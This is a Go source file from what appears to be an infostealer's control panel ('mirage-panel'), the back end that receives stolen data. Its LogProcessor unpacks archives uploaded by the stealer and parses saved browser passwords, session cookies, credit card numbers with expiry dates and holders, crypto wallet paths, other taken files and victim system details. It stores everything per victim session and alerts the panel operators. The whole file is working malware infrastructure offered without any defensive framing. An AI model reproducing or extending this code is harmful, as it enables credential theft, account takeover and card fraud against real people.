package services

import (
	"archive/zip"
	"bytes"
	"database/sql"
	"encoding/json"
	"errors"
	"path/filepath"
	"strings"

	"github.com/google/uuid"
	"github.com/user/mirage-panel/internal/ws"
)

type LogProcessor struct {
	db  *sql.DB
	hub *ws.Hub
}

func NewLogProcessor(db *sql.DB, hub *ws.Hub) *LogProcessor {
	return &LogProcessor{db: db, hub: hub}
}

func isValidPath(name string) bool {
	clean := filepath.Clean(name)
	if strings.HasPrefix(clean, "..") || filepath.IsAbs(clean) {
		return false
	}
	return true
}

func parseMetadata(jsonStr string) map[string]string {
	result := make(map[string]string)
	if jsonStr == "" {
		return result
	}
	if err := json.Unmarshal([]byte(jsonStr), &result); err != nil {
		// ponytail: silently ignore malformed metadata — the stealer
		// sends machine-generated JSON, so errors indicate a broken
		// payload, not something worth surfacing to the caller.
	}
	return result
}

func detectBrowser(filename string) string {
	name := strings.ToLower(filename)
	switch {
	case strings.Contains(name, "chrome"):
		return "chrome"
	case strings.Contains(name, "firefox"):
		return "firefox"
	case strings.Contains(name, "opera"):
		return "opera"
	case strings.Contains(name, "edge"):
		return "edge"
	case strings.Contains(name, "brave"):
		return "brave"
	case strings.Contains(name, "safari"):
		return "safari"
	case strings.Contains(name, "vivaldi"):
		return "vivaldi"
	case strings.Contains(name, "yandex"):
		return "yandex"
	case strings.Contains(name, "iexplore") || strings.Contains(name, "internet_explorer"):
		return "iexplore"
	default:
		return ""
	}
}

func parsePasswordLine(line string) (url, username, password string, ok bool) {
	parts := strings.SplitN(line, "\t", 3)
	if len(parts) < 3 {
		return "", "", "", false
	}
	return parts[0], parts[1], parts[2], true
}

func parseCookieLine(line string) (domain, name, value, path string, ok bool) {
	parts := strings.SplitN(line, "\t", 7)
	if len(parts) < 7 {
		return "", "", "", "", false
	}
	domain = parts[0]
	path = parts[2]
	name = parts[4]
	value = parts[5]
	return domain, name, value, path, true
}

func parseCardLine(line string) (number, expMonth, expYear, holder string, ok bool) {
	parts := strings.SplitN(line, "\t", 4)
	if len(parts) < 4 {
		return "", "", "", "", false
	}
	return parts[0], parts[1], parts[2], parts[3], true
}

func parseSystemInfo(content string) map[string]string {
	info := make(map[string]string)
	for _, line := range strings.Split(content, "\n") {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		parts := strings.SplitN(line, "=", 2)
		if len(parts) != 2 {
			continue
		}
		key := strings.ToLower(strings.TrimSpace(parts[0]))
		value := strings.TrimSpace(parts[1])
		info[key] = value
	}
	return info
}

const (
	maxArchiveSize = 50 * 1024 * 1024
	maxFileSize    = 10 * 1024 * 1024
	maxFileCount   = 500
)

func (p *LogProcessor) Process(archive []byte, metadataJSON string) (string, error) {
	if len(archive) > maxArchiveSize {
		return "", errors.New("archive too large")
	}

	meta := parseMetadata(metadataJSON)

	zr, err := zip.NewReader(bytes.NewReader(archive), int64(len(archive)))
	if err != nil {
		return "", err
	}

	if len(zr.File) > maxFileCount {
		return "", errors.New("too many files in archive")
	}

	type passwordEntry struct {
		URL      string
		Username string
		Password string
		Browser  string
	}
	type cookieEntry struct {
		Domain string
		Name   string
		Value  string
		Path   string
	}
	type cardEntry struct {
		Number  string
		ExpMonth string
		ExpYear string
		Holder  string
	}
	type walletEntry struct {
		Name string
		Path string
	}
	type fileEntry struct {
		Filename string
		Size     int64
	}

	var passwords []passwordEntry
	var cookies []cookieEntry
	var cards []cardEntry
	var wallets []walletEntry
	var files []fileEntry
	var systemInfoContent string

	for _, f := range zr.File {
		if !isValidPath(f.Name) {
			continue
		}

		name := filepath.Base(f.Name)
		lower := strings.ToLower(name)

		rc, err := f.Open()
		if err != nil {
			continue
		}

		if f.UncompressedSize64 > maxFileSize {
			rc.Close()
			continue
		}

		switch {
		case strings.Contains(lower, "passwords") && strings.HasSuffix(lower, ".txt"):
			buf := new(bytes.Buffer)
			buf.ReadFrom(rc)
			browser := detectBrowser(name)
			for _, line := range strings.Split(buf.String(), "\n") {
				line = strings.TrimSpace(line)
				if line == "" {
					continue
				}
				url, user, pass, ok := parsePasswordLine(line)
				if !ok {
					continue
				}
				passwords = append(passwords, passwordEntry{
					URL:      url,
					Username: user,
					Password: pass,
					Browser:  browser,
				})
			}

		case strings.Contains(lower, "cookies") && strings.HasSuffix(lower, ".txt"):
			buf := new(bytes.Buffer)
			buf.ReadFrom(rc)
			for _, line := range strings.Split(buf.String(), "\n") {
				line = strings.TrimSpace(line)
				if line == "" {
					continue
				}
				domain, name, value, path, ok := parseCookieLine(line)
				if !ok {
					continue
				}
				cookies = append(cookies, cookieEntry{
					Domain: domain,
					Name:   name,
					Value:  value,
					Path:   path,
				})
			}

		case (strings.Contains(lower, "credit_cards") || strings.Contains(lower, "cards")) && strings.HasSuffix(lower, ".txt"):
			buf := new(bytes.Buffer)
			buf.ReadFrom(rc)
			for _, line := range strings.Split(buf.String(), "\n") {
				line = strings.TrimSpace(line)
				if line == "" {
					continue
				}
				number, expMonth, expYear, holder, ok := parseCardLine(line)
				if !ok {
					continue
				}
				cards = append(cards, cardEntry{
					Number:   number,
					ExpMonth: expMonth,
					ExpYear:  expYear,
					Holder:   holder,
				})
			}

		case strings.HasPrefix(f.Name, "wallets/") || strings.HasPrefix(f.Name, "wallet/"):
			walletName := filepath.Base(f.Name)
			ext := filepath.Ext(walletName)
			walletName = strings.TrimSuffix(walletName, ext)
			wallets = append(wallets, walletEntry{
				Name: walletName,
				Path: f.Name,
			})

		case strings.EqualFold(name, "system_info.txt"):
			buf := new(bytes.Buffer)
			buf.ReadFrom(rc)
			systemInfoContent = buf.String()

		default:
			buf := new(bytes.Buffer)
			buf.ReadFrom(rc)
			files = append(files, fileEntry{
				Filename: f.Name,
				Size:     int64(buf.Len()),
			})
		}
		rc.Close()
	}

	sessionID := uuid.New().String()

	tx, err := p.db.Begin()
	if err != nil {
		return "", err
	}
	defer tx.Rollback()

	_, err = tx.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
		VALUES (?, '', ?, ?, ?, ?, ?, datetime('now'))`,
		sessionID, meta["hwid"], meta["os"], meta["username"], meta["ip"], meta["country"])
	if err != nil {
		return "", err
	}

	if len(passwords) > 0 {
		stmt, err := tx.Prepare(`INSERT INTO passwords (id, session_id, url, username, password_value, browser) VALUES (?, ?, ?, ?, ?, ?)`)
		if err != nil {
			return "", err
		}
		defer stmt.Close()
		for _, p := range passwords {
			if _, err := stmt.Exec(uuid.New().String(), sessionID, p.URL, p.Username, p.Password, p.Browser); err != nil {
				return "", err
			}
		}
	}

	if len(cookies) > 0 {
		stmt, err := tx.Prepare(`INSERT INTO cookies (id, session_id, domain, name, value, path) VALUES (?, ?, ?, ?, ?, ?)`)
		if err != nil {
			return "", err
		}
		defer stmt.Close()
		for _, c := range cookies {
			if _, err := stmt.Exec(uuid.New().String(), sessionID, c.Domain, c.Name, c.Value, c.Path); err != nil {
				return "", err
			}
		}
	}

	if len(cards) > 0 {
		stmt, err := tx.Prepare(`INSERT INTO cards (id, session_id, number, exp_month, exp_year, holder) VALUES (?, ?, ?, ?, ?, ?)`)
		if err != nil {
			return "", err
		}
		defer stmt.Close()
		for _, c := range cards {
			if _, err := stmt.Exec(uuid.New().String(), sessionID, c.Number, c.ExpMonth, c.ExpYear, c.Holder); err != nil {
				return "", err
			}
		}
	}

	if len(wallets) > 0 {
		stmt, err := tx.Prepare(`INSERT INTO wallets (id, session_id, name, path) VALUES (?, ?, ?, ?)`)
		if err != nil {
			return "", err
		}
		defer stmt.Close()
		for _, w := range wallets {
			if _, err := stmt.Exec(uuid.New().String(), sessionID, w.Name, w.Path); err != nil {
				return "", err
			}
		}
	}

	if len(files) > 0 {
		stmt, err := tx.Prepare(`INSERT INTO stolen_files (id, session_id, filename, size) VALUES (?, ?, ?, ?)`)
		if err != nil {
			return "", err
		}
		defer stmt.Close()
		for _, f := range files {
			if _, err := stmt.Exec(uuid.New().String(), sessionID, f.Filename, f.Size); err != nil {
				return "", err
			}
		}
	}

	if systemInfoContent != "" {
		info := parseSystemInfo(systemInfoContent)
		_, err = tx.Exec(`INSERT OR REPLACE INTO system_info (session_id, cpu, gpu, ram, os, screen, hostname, local_ip, mac, public_ip, hwid, uptime)
			VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
			sessionID,
			info["cpu"], info["gpu"], info["ram"], info["os"],
			info["screen"], info["hostname"], info["local_ip"],
			info["mac"], info["public_ip"], info["hwid"], info["uptime"],
		)
		if err != nil {
			return "", err
		}
	}

	if err := tx.Commit(); err != nil {
		return "", err
	}

	if p.hub != nil {
		p.hub.Broadcast(ws.NewSessionEvent(ws.NewSessionPayload{
			ID:             sessionID,
			CountryCode:    meta["country"],
			PasswordsCount: len(passwords),
		}))
	}

	return sessionID, nil
}
